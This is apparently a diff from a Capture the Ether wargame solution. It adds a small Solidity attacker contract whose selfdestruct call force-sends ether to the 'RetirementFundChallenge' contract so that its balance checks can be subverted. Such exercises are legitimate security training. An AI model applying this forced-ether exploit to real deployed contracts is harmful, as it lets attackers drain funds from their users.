@@ -40,3 +40,11 @@ contract RetirementFundChallenge {
         msg.sender.transfer(address(this).balance);
     }
 }
+
+contract RetirementFundChallengeAttacker {
+    function RetirementFundChallengeAttacker() public payable {}
+
+    function rock(address victim) public {
+        selfdestruct(victim);
+    }
+}
